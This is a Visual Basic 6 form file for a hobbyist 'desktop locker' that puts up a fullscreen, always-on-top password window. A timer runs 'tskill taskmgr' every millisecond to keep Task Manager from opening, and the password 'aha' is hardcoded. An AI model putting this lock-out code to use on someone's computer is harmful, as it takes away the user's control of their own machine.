VERSION 5.00
Begin VB.Form frm1 
   BackColor       =   &H00400040&
   BorderStyle     =   0  'None
   Caption         =   "Pengunci Desktop"
   ClientHeight    =   11475
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   20490
   ClipControls    =   0   'False
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   950.68
   ScaleMode       =   0  'User
   ScaleWidth      =   1366
   ShowInTaskbar   =   0   'False
   WindowState     =   2  'Maximized
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   2760
      Top             =   240
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00400040&
      Caption         =   "Login Donk !"
      BeginProperty Font 
         Name            =   "Juice ITC"
         Size            =   14.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000E&
      Height          =   1335
      Left            =   120
      TabIndex        =   1
      Top             =   0
      Width           =   3255
      Begin VB.CommandButton cmd_login 
         Caption         =   "Login"
         Default         =   -1  'True
         Height          =   375
         Left            =   1080
         TabIndex        =   2
         Top             =   840
         Width           =   1215
      End
      Begin VB.TextBox txt_pass 
         Alignment       =   2  'Center
         BeginProperty Font 
            Name            =   "Forte"
            Size            =   24
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   405
         IMEMode         =   3  'DISABLE
         Left            =   600
         PasswordChar    =   "*"
         TabIndex        =   0
         Top             =   360
         Width           =   2055
      End
   End
End
Attribute VB_Name = "frm1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmd_login_Click()
If txt_pass.Text = "aha" Then
    End
Else
    frm2.Show
End If
End Sub

Private Sub Form_Load()
MakeTopmost Me, True

'flash2.Movie = App.Path & "\animasi.swf"
End Sub
Private Sub Timer1_Timer()
Shell ("tskill taskmgr"), vbHide
End Sub
